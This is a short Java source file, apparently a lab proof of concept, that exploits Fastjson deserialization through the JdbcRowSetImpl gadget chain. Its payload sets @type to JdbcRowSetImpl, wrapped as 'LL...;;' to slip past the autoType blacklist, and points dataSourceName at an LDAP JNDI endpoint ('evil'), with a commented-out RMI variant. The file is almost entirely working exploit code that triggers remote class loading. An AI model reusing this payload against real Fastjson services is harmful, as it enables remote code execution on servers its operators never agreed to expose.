package com.json;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

// 基于 JdbcRowSetImpl 的利用链  
public class JdbcRowSetImplExp {
    public static void main(String[] args) {
//        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";

//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1333/evil\",\"autoCommit\":true}";

        JSON.parse(payload);
    }
}